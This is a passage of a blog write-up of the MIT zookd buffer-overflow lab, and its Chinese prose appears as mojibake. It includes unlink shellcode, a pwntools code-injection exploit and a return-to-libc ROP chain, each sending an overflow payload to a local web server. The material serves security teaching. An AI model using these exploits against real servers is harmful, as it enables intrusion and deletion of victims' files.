<p>è¯„æµ‹çš„åŸç†æ˜¯æ£€æŸ¥ <code>/tmp/strace.log</code> å½“ä¸­æ˜¯å¦æœ‰ <code>SIGSEGV</code> å­—ç¬¦ä¸²ï¼Œç¬”è€…ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆåæ­£ç¬”è€…ç”µè„‘ä¸Šæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œå°±è·³è¿‡äº†ï¼ˆ<del>ğŸ‘´çš„è¯„ä»·æ˜¯ğŸ”ˆâ†‘â†“</del>ï¼‰</p>
<blockquote>
<p>ä½†æ˜¯æ¯”è¾ƒ SB çš„æ˜¯è¯„æµ‹ç”¨çš„æ˜¯ MIT ç¼–è¯‘çš„ zookd è€Œä¸æ˜¯æˆ‘ä»¬è‡ªè¡Œç¼–è¯‘çš„ï¼Œç„¶åä»–å°±ä¼šç»™ğŸ‘´æŠ¥è¿™ç§SBé”™è¯¯ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/29/Fs1Ka4xTNtWXPrq.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç„¶åğŸ‘´è‡ªå·±å†é‡æ–°è¯•ç€è·‘ zookd ä¼šå‘ç°ï¼Œ<del>å› ä¸ºğŸ‘´çš„å­¦ç”ŸğŸ“æ˜¯è€æ—§çš„ Ubuntu20ï¼ŒğŸ‘´çš„è¯„ä»·æ˜¯ğŸ”ˆâ†‘â†“</del>ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/29/uBRnHQ4lMjfwLrU.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æœ€åç¬”è€…çš„è§£å†³æ–¹æ¡ˆæ˜¯æ‹‰äº†ä¸€ä¸ª Ubuntu 22.04 çš„å®¹å™¨åœ¨é‡Œé¢åšâ€¦</p>
</blockquote>
<h2 id="Part-2-Code-injection"><a href="#Part-2-Code-injection" class="headerlink" title="Part 2: Code injection"></a>Part 2: Code injection</h2><p>è¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯è®©æˆ‘ä»¬è¿›è¡Œä»£ç æ³¨å…¥æ¥åˆ æ‰æœåŠ¡å™¨ä¸Šçš„ <code>/home/student/grades.txt</code> æ–‡ä»¶ï¼ˆè‡ªå·±åˆ›ä¸€ä¸ªå°±è¡Œï¼‰ï¼Œè¦æ±‚æˆ‘ä»¬ä½¿ç”¨æ ˆå…·æœ‰å¯æ‰§è¡Œæƒé™çš„ <code>zookd-exstack</code>ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd-exstack 8080</span><br></code></pre></td></tr></table></figure>

<p>å®éªŒè¿˜ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä»½ shellcode æ¨¡æ¿ <code>shellcode.S</code>ï¼Œå½“æˆ‘ä»¬ <code>make</code> çš„æ—¶å€™å…¶ä¼šè¢«ç¼–è¯‘æˆ <code>shellcode.bin</code>ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>run-shellcode</code> æ¥éªŒè¯å…¶åŠŸèƒ½æ€§ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./run-shellcode shellcode.bin</span><br></code></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æ˜¯ Exercise3ï¼Œä¿®æ”¹ shellcode ä½¿å…¶èƒ½åˆ é™¤  <code>/home/student/grades.txt</code>ï¼š</p>
<blockquote>
<p><strong>Exercise 3 (warm-up).</strong> Modify <code>shellcode.S</code> to unlink <code>/home/student/grades.txt</code>. Your assembly code can either invoke the <code>SYS_unlink</code> system call, or call the <code>unlink()</code> library function.</p>
</blockquote>
<p>é‡Œè¾¹æ˜¯<del>ä¸‘é™‹çš„</del> AT&amp;T æ±‡ç¼–ï¼Œç¬”è€…é€‰æ‹©ç›´æ¥é‡å†™ä¸€ä»½ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.globl main<br>	.type	main, @function<br><br> main:<br>	/* store the string on the stack */<br>	xorq  %rax, %rax<br>	pushq %rax<br>	movq  $0x7478742e73656461, %rax /* &quot;ades.txt&quot; */<br>	pushq %rax<br>	movq  $0x72672f746e656475, %rax /* &quot;udent/gr&quot; */<br>	pushq %rax<br>	movq  $0x74732f656d6f682f, %rax /* &quot;/home/st&quot; */<br>	pushq %rax<br><br>	/* unlink(rsp) */<br>	pushq %rsp<br>	popq  %rdi<br>	movq  $87, %rax /* SYS_unlink */<br>	syscall<br><br>	/* exit() */<br>	xorq  %rdi, %rdi<br>	movq  $60, %rax	/* SYS_exit */<br>	syscall<br><br></code></pre></td></tr></table></figure>

<p>æˆåŠŸåˆ é™¤æ–‡ä»¶ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/03/FX8UsCbyW72fOtw.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä¹‹åå®éªŒæ–‡ä»¶æç¤ºæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ strace æ¥è·Ÿè¸ª zookd æ‰€ä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆéœ€è¦rootï¼‰ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">strace -f -p $(pgrep zookd-)</span><br></code></pre></td></tr></table></figure>

<p>æ¯”å¦‚è¯´ç¬”è€…å…ˆèµ·ä¸€ä¸ª zookd å†è¿è¡Œ straceï¼Œä¹‹åç”¨å‰é¢çš„ exp æ‰“ä¸€ä¸‹ zookd å°±å¯ä»¥çœ‹åˆ°ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/03/oKDm5yIjCin6OpG.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å‰é¢çš„è¯„æµ‹åº”è¯¥æ˜¯åŸºäºè¿™ä¸ªå®Œæˆçš„ï¼Œä½†æ˜¯ç¬”è€…å‘ç°åœ¨ <code>/tmp/strace.log</code> å½“ä¸­ä¸ä¼šè®°å½• <code>SIGSEGV</code> å­—ç¬¦ä¸²ï¼Œ<del>ğŸ‘´ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰€ä»¥è¿™é‡Œå°±å…ˆâ‘§ç®¡äº†</del></p>
<p><img src="https://s2.loli.net/2022/12/03/GkpjiZWb71HyhD3.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä»¥åŠæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ gdb è¿›è¡Œè°ƒè¯•ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gdb -p $(pgrep zookd-)</span><br></code></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/12/03/M8HgfPEkdl2Vypi.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä¹‹åå®éªŒæ‰‹å†Œæ‰¯äº†ä¸€å †æ€ä¹ˆè°ƒè¯•ï¼Œè¿™é‡Œå°±ä¸ç®¡äº†ï¼Œä¸‹é¢æ¥çœ‹ Exercise 4ï¼Œå¤§æ¦‚æ˜¯è®©æˆ‘ä»¬ç”¨ ret2shellcode æ¥æ‰“ zookd</p>
<blockquote>
<p><strong>Exercise 4.</strong> Starting from one of your exploits from Exercise 2, construct an exploit that hijacks the control flow of the web server and unlinks <code>/home/student/grades.txt</code>. Save this exploit in a file called <code>exploit-4.py</code>.</p>
<p>Verify that your exploit works; you will need to re-create <code>/home/student/grades.txt</code> after each successful exploit run.</p>
<p>Suggestion: first focus on obtaining control of the program counter. Sketch out the stack layout that you expect the program to have at the point when you overflow the buffer, and use <code>gdb</code> to verify that your overflow data ends up where you expect it to. Step through the execution of the function to the return instruction to make sure you can control what address the program returns to. The <code>next</code>, <code>stepi</code>, and <a target="_blank" rel="noopener" href="https://visualgdb.com/gdbreference/commands/x"><code>x</code></a> commands in <code>gdb</code> should prove helpful.</p>
<p>Once you can reliably hijack the control flow of the program, find a suitable address that will contain the code you want to execute, and focus on placing the correct code at that addressâ€”e.g. a derivative of the provided shell code.</p>
</blockquote>
<p>å› ä¸ºæ²¡æœ‰å¼€ ASLR è€Œä¸”æ ˆå…·æœ‰å¯æ‰§è¡Œæƒé™ï¼Œé‚£ä¹ˆç¬”è€…ç›´æ¥ç”¨ <code>nop</code> ä½œä¸º slide code å¹¶åœ¨æ ˆä¸Šé åçš„ä½ç½®å¸ƒç½® shellcode å³å¯ï¼Œè¿™é‡Œæ³¨æ„åˆ«å¿˜äº†æŠŠ shellcode å½“ä¸­çš„ <code>\x00</code> ç¼–ç æˆ <code>%00</code> å¦åˆ™ä¼šè¢«è¿‡æ»¤æ‰</p>
<blockquote>
<p>ç¼–å†™ shellcode æ˜¯ pwn æ‰‹æœ€åŸºç¡€çš„æŠ€èƒ½ï¼Œå¦‚æœä½ ä¸ä¼šçš„è¯â€¦â€¦  ï¼šï¼‰</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode_text = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* push string */</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x7478742e73656461</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x72672f746e656475</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x74732f656d6f682f</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* print the string */</span><br><span class="hljs-string">    mov rdx, 25</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* remove the file */</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    mov rax, 87</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* exit normally */</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    mov rax, 60</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    shellcode = asm(<span class="hljs-string">&#x27;nop&#x27;</span>) * <span class="hljs-number">4096</span> + asm(shellcode_text)<br>    payload = (p64(<span class="hljs-number">0x7fffffffe000</span>) * <span class="hljs-number">128</span> + shellcode).replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(req)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>ç¬”è€…ç¼–å†™çš„ shellcode å½“ä¸­æœ‰ <code>exit(0)</code> æ‰€ä»¥ä¸ä¼šæŠ¥ SIGSEGVï¼Œä½†æ˜¯æœ‰ä¸ªæ‰“å°å­—ç¬¦ä¸²çš„æ“ä½œè®©æˆ‘ä»¬å¯ä»¥ç›´è§‚åœ°çœ‹åˆ°ä»£ç æ‰§è¡ŒæˆåŠŸï¼Œå¦‚æœä½ æƒ³çœ‹ SIGSEGV ä¹Ÿå¯ä»¥æŠŠæœ€åçš„ exit ä»£ç å»æ‰ï¼šï¼‰</p>
<p><img src="https://s2.loli.net/2022/12/03/2BrKMLp4vlESICT.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæµ‹è¯„ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-exstack</span><br></code></pre></td></tr></table></figure>

<p>é€šè¿‡</p>
<p><img src="https://s2.loli.net/2022/12/03/AkztJ2qahmWZuOo.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="Part-3-Return-to-libc-attacks"><a href="#Part-3-Return-to-libc-attacks" class="headerlink" title="Part 3: Return-to-libc attacks"></a>Part 3: Return-to-libc attacks</h2><p>æ¥ä¸‹æ¥ç»ˆäºåˆ°äº†<del>å¤§ä¸€å°æœ‹å‹éƒ½ä¼šçš„</del> ret2libc æ”»å‡»çš„éƒ¨åˆ†ï¼Œè¿™ä¸€æ¬¡æˆ‘ä»¬éœ€è¦ä½¿ç”¨æ ˆä¸å…·æœ‰å¯æ‰§è¡Œæƒé™çš„ <code>zookd-nxstack</code> ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd-nxstack 8080</span><br></code></pre></td></tr></table></figure>

<p><strong>è¿”å›å¯¼å‘ç¼–ç¨‹</strong>ï¼ˆreturn-oriented programmingï¼Œ <strong>ROP</strong>ï¼‰æ˜¯ç”¨æ¥çªç ´åŒ…æ‹¬ ASLRã€æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤åœ¨å†…çš„æœ€ä¸ºç»å…¸çš„æ”»å‡»æ‰‹æ³•ï¼Œ<del>ä½ è¦æ˜¯ä¸ä¼šğŸ‘´ä¹Ÿâ‘§æ•™ä½ ï¼Œè‡ªå·±å­¦å»</del>ï¼Œ<code>ret2libc</code> æŒ‡çš„åˆ™æ˜¯åˆ©ç”¨ libc ä¸­çš„ gadget æ¥å®Œæˆ ROP chain çš„æ„å»º</p>
<p>å®éªŒæ‰‹å†Œä¸­é—´çš„ä¸€å †ä»‹ç»å’Œè¯´æ˜ç›´æ¥è·³äº†ï¼Œ<del>æ²¡å•¥æ„æ€</del>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¤§è¸æ­¥è¿›å…¥ Exercise 5ï¼šç”¨ <code>ret2libc</code> è¿™ä¸€æ”»å‡»æ‰‹æ³•æ¥å®Œæˆå¯¹ zookd çš„æ”»å‡»</p>
<blockquote>
<p><strong>Exercise 5.</strong> Starting from your exploit in Exercises 2 and 4, construct an exploit that unlinks <code>/home/student/grades.txt</code> when run on the binaries that have a non-executable stack. Name this new exploit <code>exploit-5.py</code>.</p>
<p>In this attack you are going to take control of the server over the network <em>without injecting any code</em> into the server. You should use a return-to-libc attack where you redirect control flow to code that already existed before your attack. The outline of the attack is to perform a buffer overflow that:</p>
<ol>
<li>causes the argument to the chosen libc function to be on stack</li>
<li>then causes <code>accidentally</code> to run so that argument ends up in <code>%rdi</code></li>
<li>and then causes <code>accidentally</code> to return to the chosen libc function</li>
</ol>
<p>It will be helpful to draw a stack diagram like the figures in <a target="_blank" rel="noopener" href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the Stack in the 21st Century</a> at (1) the point that the buffer overflows and (2) at the point that <code>accidentally</code> runs.</p>
</blockquote>
<p>é¦–å…ˆ <code>checksec</code> ï¼Œé™¤äº† canary ä»¥å¤–çš„ä¿æŠ¤éƒ½å¼€äº†â€¦</p>
<p><img src="https://s2.loli.net/2022/12/03/M5TCnY6tDLNB2Fa.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å¼€äº† PIE æ¯”è¾ƒéš¾å¼„ï¼Œè™½ç„¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ partial overwrite çš„æ–¹å¼æ¥åœ¨ text æ®µçš„åŒä¸€å¼ é¡µé¢ä¸Šè¿›è¡Œä¸€æ¬¡è·³è½¬ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜ä¸çŸ¥é“æˆ‘ä»¬çš„å‚æ•°åˆ° <code>http_request_headers()</code> æ ˆåº•é—´çš„è·ç¦»</p>
<p>ä¿¡æ¯æ³„éœ²è¿™ä¸€æ­¥æ¯”è¾ƒéš¾å¼„ï¼Œäºæ˜¯ç¬”è€…çœ‹äº†çœ‹å…¶ä»–äººçš„åšæ³•ï¼Œå‘ç°**å¤§å®¶éƒ½æ˜¯ç›´æ¥ç”¨ gdb çœ‹ç¨‹åºä»¥åŠ libc çš„åŸºå€â€¦**ï¼ˆ<del>ğŸ‘´å¯»æ€è¿™â‘ ä¸¶ä¹Ÿâ‘§å®æˆ˜å•Šï¼Œ</del>ä¼°è®¡æ˜¯ä¸ºäº†æ•™å­¦ç›®çš„é™ä½äº†éš¾åº¦ï¼‰</p>
<blockquote>
<p>ç¬”è€…æƒ³äº†å¤§åŠå¤©æ€ä¹ˆæ„å»º ROPã€æ€ä¹ˆæ³„éœ² libc åœ°å€ã€é€†äº†åŠå¤©ç¨‹åºæ‰¾å¯ç”¨çš„ gadgetï¼Œæœ€åæ‰çŸ¥é“è¿™ä¸ªå®éªŒæ˜¯ç›´æ¥ç”¨ gdb æŸ¥çœ‹ç¨‹åºä»£ç æ®µ+libc çš„åœ°å€â€¦<del>æŒºæ— è¯­çš„å…¶å®</del></p>
</blockquote>
<p>é‚£ç¬”è€…åªå¥½ä¹Ÿè¿™ä¹ˆåšäº†ï¼ˆç¬‘ï¼‰ï¼Œè™½ç„¶è¯´ä»–æä¾›äº†ä¸€ä¸ªè«åå…¶å¦™çš„ <code>accidentially()</code> å‡½æ•°ä½†æ˜¯ç¬”è€…é€‰æ‹©ç›´æ¥å¿½ç•¥ï¼Œéšä¾¿æ‰¾ç¨‹åºä¸­çš„ä¸€ä¸ª <code>ret</code> æ„é€ æ»‘æ¿åé¢è·Ÿ ROP é“¾å³å¯ï¼Œå› ä¸ºè¿™ä¸ª Exercise è¯´å®è¯åšèµ·æ¥è«åå…¶å¦™çš„æ‰€ä»¥ç¬”è€…ä¹Ÿç”¨è«åå…¶å¦™çš„è§£æ³•å¥½äº†ï¼ˆç¬‘ï¼‰ï¼Œè¿™é‡Œé…åˆ ROPgadget æ‰¾äº†ä¸€äº› gadget éšä¾¿å‡‘äº†ä¸€ä¸ªå¯ç”¨çš„ ROP chainï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_malicious_request</span>():<br>    e = ELF(<span class="hljs-string">&#x27;./zookd-nxstack&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>    libc_base = <span class="hljs-number">0x1555552e8000</span><br>    <br>    pop_rdi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()<br>    pop_rdx_pop_rbx_ret = libc_base + <span class="hljs-number">0x11f497</span> <span class="hljs-comment"># &#x27;pop rdx ; ret&#x27; by search can&#x27;t be used</span><br>    pop_rcx_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rcx ; ret&#x27;</span>)).__next__()<br>    ret = pop_rdi_ret + <span class="hljs-number">1</span><br>    copy_gadget = libc_base + <span class="hljs-number">0xc5163</span> <span class="hljs-comment"># mov qword ptr [rax + rdx - 8], rdi ; ret</span><br>    push_rax_pop_rbx_ret = libc_base + <span class="hljs-number">0x1750eb</span><br>    mov_rdi_rbx_call_rcx = libc_base + <span class="hljs-number">0x15e9d8</span><br>    <br>    func_malloc = libc_base + libc.sym[<span class="hljs-string">&#x27;malloc&#x27;</span>]<br>    func_unlink = libc_base + libc.sym[<span class="hljs-string">&#x27;unlink&#x27;</span>]<br><br>    <span class="hljs-comment"># ret for slide</span><br>    payload  = <span class="hljs-number">512</span> * p64(ret)<br>    <span class="hljs-comment"># alloc a chunk to store the string</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x100</span>) + p64(func_malloc)<br>    <span class="hljs-comment"># copy string to chunk</span><br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x8</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x74732f656d6f682f</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x72672f746e656475</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x18</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x7478742e73656461</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x20</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(copy_gadget)<br>    <span class="hljs-comment"># call unlink(chunk)</span><br>    payload += p64(pop_rcx_ret) + p64(func_unlink)<br>    payload += p64(push_rax_pop_rbx_ret)<br>    payload += p64(mov_rdi_rbx_call_rcx)<br><br>    <span class="hljs-comment"># url encoding</span><br>    payload = payload.replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br><br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br><br>    <span class="hljs-keyword">return</span> req<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br>    sock.send(get_malicious_request())<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>ç¬”è€…çš„è§£æ³•ç®€å•æ¥è¯´æ˜¯ç”¨ malloc æ¥åˆ†é…ä¸€ä¸ª chunk å¾€ä¸Šé¢å†™å­—ç¬¦ä¸²ï¼Œä¹‹å <code>unlink(chunk)</code> å³å¯</p>
<p><img src="https://s2.loli.net/2022/12/04/O5euynk9jE3GoH7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæ£€æŸ¥ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-libc</span><br></code></pre></td></tr></table></figure>

<p>é€šè¿‡âˆš</p>
<p><img src="https://s2.loli.net/2022/12/04/ElDbUBFJ3rqatNW.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç„¶åæ˜¯ä¸€ä¸ª <em>Challenge</em> ï¼Œ<strong>åœ¨ä¸ä¾èµ– <code>accidentally()</code> å‡½æ•°çš„æƒ…å†µä¸‹æ„é€  ROP</strong>ï¼Œæç¤ºäº†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ROPgadget æ¥å¯»æ‰¾ gadget ï¼š</p>
<blockquote>
